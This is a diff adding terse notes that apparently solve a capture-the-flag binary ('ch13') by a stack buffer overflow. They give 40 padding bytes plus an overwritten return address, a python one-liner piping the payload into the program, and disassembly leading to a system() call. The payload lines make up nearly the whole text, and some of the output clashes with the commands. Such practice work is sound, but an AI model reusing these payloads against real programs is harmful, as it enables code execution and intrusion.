@@ -1,0 +1,30 @@
+EIP Overwrite
+=============
+
+>>> print "A" * 40 + "\x16\x85\x04\x08"
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde
+0x08048516
+\x16\x85\x04\x08
+
+
+Success
+=======
+0x08048522
+python -c 'print "A" * 40 + "\xef\xbe\xad\xde"' | ./ch13
+
+
+jmp to 0x08048522:
+
+nasm > jmp 0x08048522
+00000000  E91D850408        jmp 0x8048522
+
+\x08\x04\x85\x1d\xe9
+
+  0x08048522 <+142>:	mov    DWORD PTR [esp],0x804867e
+   0x08048529 <+149>:	call   0x80483b0 <system@plt>
+
+
+\x08\x04\x85\x1d\xe9
